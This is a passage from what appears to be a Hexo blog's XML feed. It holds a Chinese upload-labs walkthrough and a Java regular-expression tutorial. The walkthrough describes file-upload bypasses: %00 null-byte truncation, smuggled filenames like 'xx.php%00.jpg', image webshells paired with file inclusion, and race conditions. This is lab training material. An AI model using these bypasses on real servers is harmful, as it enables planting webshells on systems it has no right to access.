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" alt="img">使用00%截断绕过(截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态)<img src="data:image/png;base64,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" alt="img"></p>
<h5 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h5><p>和上个pass思路一样,因为存储路径可控,所以一样使用00截断,只不过 这次的路劲通过POST方式传递,不会对%00进行url解码,所以需要在burp suite的hex功能点处,找到对应位置,将其修改为00</p>
<h5 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h5><p>该pass检查文件开头的标识,所以用图片马过需要配合文件包含漏洞或者解析漏洞</p>
<h5 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h5><p>该pass通过getimagesize($filename);函数判断是否为图片需要配合文件包含漏洞或者解析漏洞</p>
<h5 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h5><p>因为是先上传再判断,所以存在条件竞争重复发上传的数据包,在存在的一瞬间访问到</p>
<h5 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h5><p>条件竞争,并且先判断了后缀再移动,上传图片马,利用文件包含漏洞</p>
<h5 id="pass-19"><a href="#pass-19" class="headerlink" title="pass-19"></a>pass-19</h5><p>1.上传名称可控,但是是黑名单判断,可以写xx.php%00.jpg用%00截断</p>
<p>2.将保存名称写为xxx.php/.绕过黑名单,并且还会保存为xxx.php</p>
]]></content>
      <categories>
        <category>upload</category>
      </categories>
      <tags>
        <tag>upload</tag>
        <tag>upload-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>java正则表达式</title>
    <url>/2021/12/06/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<p>首先感谢<a href="https://www.bilibili.com/video/BV1Eq4y1E79W?p=1&spm_id_from=pageDriver">韩顺平老师的课程</a>!!</p>
<h4 id="正则匹配中贪婪模式和非贪婪模式的区别"><a href="#正则匹配中贪婪模式和非贪婪模式的区别" class="headerlink" title="正则匹配中贪婪模式和非贪婪模式的区别"></a>正则匹配中贪婪模式和非贪婪模式的区别</h4><p>我个人理解为,贪婪模式情况下,会尽可能多的进行每一次的匹配,非贪婪模式每一次进行匹配都会找尽可能短的满足<code>?</code>前条件的字符完成本次匹配</p>
<h4 id="java正则简单实现"><a href="#java正则简单实现" class="headerlink" title="java正则简单实现"></a>java正则简单实现</h4><p>简单实践,后面记录各个类和方法的信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">r1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String content=<span class="string">&quot;2000年5月，JDK1.3、JDK1.4和J2SE1.3相继发布，几周后其获得了Apple公司Mac OS X的工业标准的支持。2001年9月24日，J2EE1.3发布。&quot;</span> +</span><br><span class="line">                <span class="string">&quot;2002年2月26日，J2SE1.4发布。自此Java的计算能力有了大幅提升，与J2SE1.3相比，其多了近62%的类和接口。在这些新特性当中，还提供了广泛的XML支持、安全套接字（Socket）支持（通过SSL与TLS协议）、全新的I/OAPI、正则表达式、日志与断言。&quot;</span> +</span><br><span class="line">                <span class="string">&quot;2004年9月30日，J2SE1.5发布，成为Java语言发展史上的又一里程碑。为了表示该版本的重要性，J2SE 1.5更名为Java SE 5.0（内部版本号1.5.0），&quot;</span> +</span><br><span class="line">                <span class="string">&quot;代号为“Tiger”，Tiger包含了从1996年发布1.0版本以来的最重大的更新，其中包括泛型支持、基本类型的自动装箱、改进的循环、枚举类型、&quot;</span> +</span><br><span class="line">                <span class="string">&quot;格式化I/O及可变参数。&quot;</span>;</span><br><span class="line">		<span class="comment">//匹配数字或者单词</span></span><br><span class="line">        Pattern pattern = Pattern.compile(<span class="string">&quot;\\d\\d\\d\\d&quot;</span>);</span><br><span class="line">        <span class="comment">//2.创建一个匹配器对象</span></span><br><span class="line">        Matcher matcher= pattern.matcher(content);</span><br><span class="line">        <span class="comment">//可以循环匹配</span></span><br><span class="line">        <span class="keyword">while</span>(matcher.find())&#123;</span><br><span class="line">            <span class="comment">//匹配文本放到matcher.group(0)</span></span><br><span class="line">            System.out.println(<span class="string">&quot;找到&quot;</span>+matcher.group(<span class="number">0</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="matcher-find-完成的任务"><a href="#matcher-find-完成的任务" class="headerlink" title="matcher.find()完成的任务:"></a><code>matcher.find()</code>完成的任务:</h5><p>1.根据指定的规则定位满足规则的子字符串(比如2000)</p>
<p>2.找到后,将子字符串的开始索引记录到matcher对象的属性int[] groups;</p>
<p><img src="/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207000454930.png" alt="image-20211207000454930"></p>
<p><img src="/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207000542796.png"></p>
<p>groups[0]=0,把该子字符串的结束的索引+1的值记录到groups[1]=4</p>
<p>3.同时记录oldLast值为子字符串的结束的索引+1,即下次执行find方法时就从记录的索引位置4开始匹配</p>
<p>group()源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">group</span><span class="params">(<span class="keyword">int</span> group)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (first &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;No match found&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (group &lt; <span class="number">0</span> || group &gt; groupCount())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException(<span class="string">&quot;No group &quot;</span> + group);</span><br><span class="line">        <span class="keyword">if</span> ((groups[group*<span class="number">2</span>] == -<span class="number">1</span>) || (groups[group*<span class="number">2</span>+<span class="number">1</span>] == -<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> getSubSequence(groups[group * <span class="number">2</span>], groups[group * <span class="number">2</span> + <span class="number">1</span>]).toString();<span class="comment">//截取字符串</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>1.根据groups[0]和groups[1]的记录位置,从content开始截取,从content开始截取字符串返回就是[0,4),包含0但是不包含索引为4的位置</p>
<p>如果再次执行find方法,仍然按照上面的方法,groups[0]和groups[1]记录本次的开始和结束位置,group[0]记录的是下次!<img src="/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207001258292.png"></p>
<p><code>Pattern pattern = Pattern.compile(&quot;(\\d\\d)(\\d\\d)&quot;);</code>加上括号,分组匹配:</p>
<p>根据指定的规则，定位满足规则的子字符串(比如(20)(00))</p>
<p>1.找到后将 子字符串的开始索引 group[0]=0 记录到 matcher 对象的熟悉 int[] groups数组中；<br>2.1 groups[0] = 0, 把该子字符串的结束的索引+1的值记录到 groups[1] = 4<br>2.2 记录1组()匹配到的子字符串 groups[2] = 0 groups[3] = 2<br>2.3 记录2组()匹配到的子字符串 groups[4] = 2 groups[5] = 4</p>
<p><img src="/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207004146025.png"></p>
<p>2.4 如果有更多的分组，同理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;找到：&quot;</span> + matcher.group(<span class="number">0</span>)); <span class="comment">// 2000</span></span><br><span class="line">            System.out.println(<span class="string">&quot;第一组匹配到的值: &quot;</span> + matcher.group(<span class="number">1</span>)); <span class="comment">// 2</span></span><br><span class="line">            System.out.println(<span class="string">&quot;第二组匹配到的值: &quot;</span> + matcher.group(<span class="number">2</span>)); <span class="comment">// 000</span></span><br><span class="line">            <span class="comment">// System.out.println(&quot;找到：&quot; + matcher.group(3)); 索引越界</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<img src="/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207004834793.png" style="zoom:80%;" />

<p>3.同时记录 oldLast 的值为 子字符串的结束的 索引+1的值即69，即下次执行find时，就从69开始匹配。</p>
<p><strong>我的理解是,group[0]永远获取的是每次整个表达式匹配的结果,group(1)和group(2)则是每次匹配到的括号内的内容</strong></p>
<h5 id="转义字符的使用"><a href="#转义字符的使用" class="headerlink" title="转义字符的使用"></a>转义字符的使用</h5><p>注:在java的正则表达式中,两个\\代表一个\</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String content = <span class="string">&quot;abc$(a.bc(123(&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 俩个 \\ 字符表示 \</span></span><br><span class="line">        Pattern compile = Pattern.compile(<span class="string">&quot;\\(&quot;</span>);</span><br><span class="line">        <span class="comment">// 2.创建一个匹配器对象</span></span><br><span class="line">        Matcher matcher = compile.matcher(content);</span><br><span class="line">        <span class="comment">// 3. 可以循环匹配</span></span><br><span class="line">        <span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line">            <span class="comment">// 匹配内容，文本，放到 m.group(0)</span></span><br><span class="line">            System.out.println(<span class="string">&quot;找到：&quot;</span> + matcher.group(<span class="number">0</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="区分大小写"><a href="#区分大小写" class="headerlink" title="区分大小写"></a>区分大小写</h4><p>java正则表达式默认是区分大小写的,如何实现不区分大小写</p>
<ul>
<li>(?i)abc      表示abc都不区分大小写</li>
<li>a(?i)bc       表示bc不区分大小写</li>
<li>a((?i)b)c     表示只有b不区分大小写</li>
<li><code>Pattern pat  = Pattern.compile(regEx,pattern.CASE_INSENSITIVE);</code>开启不区分大小写的匹配,整个regEx都不区分大小写</li>
</ul>
<h4 id="关于-的一些注意点"><a href="#关于-的一些注意点" class="headerlink" title="关于[ ]的一些注意点"></a>关于[ ]的一些注意点</h4><p>^在[ ]内表示非</p>
<p>[ ]内的任意字符之间都是或的关系</p>
<p>[ ]内的符号就只是一个符号了,不带特殊功能    <strong>注意:在( )内要加转义符</strong></p>
<h4 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h4><table>
<thead>
<tr>
<th>示例</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>(abc)*</td>
<td>仅包含任意个abc的字符串</td>
</tr>
<tr>
<td>m+(abc)*</td>
<td>以m开头,后接任意个abc的字符串</td>
</tr>
<tr>
<td>m+abc?</td>
<td>以m开头,后接ab或者abc的字符串</td>
</tr>
<tr>
<td>[abcd]{3}</td>
<td>由abcd中字母组成的任意长度为3的字符串</td>
</tr>
<tr>
<td>[abcd]{3,}</td>
<td>由abcd中字母组成的任意长度不小于3的字符串</td>
</tr>
<tr>
<td>[abcd]{3,5}</td>
<td>由abcd中字母组成的任意长度不小于3,不大于5的字符串(左闭右开)</td>
</tr>
</tbody></table>
<p>java匹配默认贪婪匹配</p>
<h4 id="定位符"><a href="#定位符" class="headerlink" title="定位符"></a>定位符</h4><p>定位符,规定要匹配的字符串出现的位置,比如在字符串的开始还是在结束的位置</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
<th>示例</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>^</td>
<td>指定起始字符</td>
<td>^[0-9]+[a-z]*</td>
<td>以至少1个数字开头,后接任意个小写字母的字符串</td>
</tr>
<tr>
<td>$</td>
<td>指定结束字符</td>
<td>^[0-9]\-[a-z]+$</td>
<td>以1个数字开头后接连字符”-“,并以至少1个小写字母结尾的字符串</td>
</tr>
<tr>
<td>\b</td>
<td>匹配目标字符串的边界</td>
<td>er\b</td>
<td>匹配forev<code>er</code>中的er,但不匹配verb中的er</td>
</tr>
<tr>
<td>\B</td>
<td>匹配目标字符串的非边界</td>
<td>er\B</td>
<td>匹配v<code>er</code>b中的er,但不匹配forever中的er</td>
</tr>
</tbody></table>
<h4 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h4><h5 id="pattern"><a href="#pattern" class="headerlink" title="(pattern)"></a>(pattern)</h5><p>非命名捕获,捕获匹配的子字符串,编号为0的第一个捕获是由整个正则表达式模式匹配的文本(即group(0)),其它捕获结果则根据左括号的顺序从1开始自动编号</p>
<h5 id="lt-name-gt"><a href="#lt-name-gt" class="headerlink" title="(?&lt;name&gt;)"></a>(?&lt;name&gt;)</h5><p>命名捕获,将匹配的字符串捕获到一个组名称或编号名称中,用于name的字符串不能包含任何表单符号,并且不能以数字开头,可以使用单引号替代尖括号,例如(?’name’)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">r1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String content=<span class="string">&quot;dsfdsfds s7789 nn1189han&quot;</span>;</span><br><span class="line"><span class="comment">//      String regStr=&quot;^[0-9]+[a-z]+\\d+$&quot;;</span></span><br><span class="line">        String regStr=<span class="string">&quot;(?&lt;g1&gt;\\d\\d)(?&lt;g2&gt;\\d\\d)&quot;</span>;</span><br><span class="line">        Pattern pattern=Pattern.compile(regStr);</span><br><span class="line">        <span class="comment">//创建一个匹配器对象</span></span><br><span class="line">        Matcher matcher= pattern.matcher(content);</span><br><span class="line">        <span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;找到：&quot;</span> + matcher.group(<span class="number">0</span>)); <span class="comment">// 2000</span></span><br><span class="line">            System.out.println(<span class="string">&quot;分组1(根据组名): &quot;</span>+matcher.group(<span class="string">&quot;g1&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;分组1: &quot;</span>+matcher.group(<span class="number">1</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;分组2(根据组名): &quot;</span>+matcher.group(<span class="string">&quot;g2&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;分组2: &quot;</span>+matcher.group(<span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207234020782.png"></p>
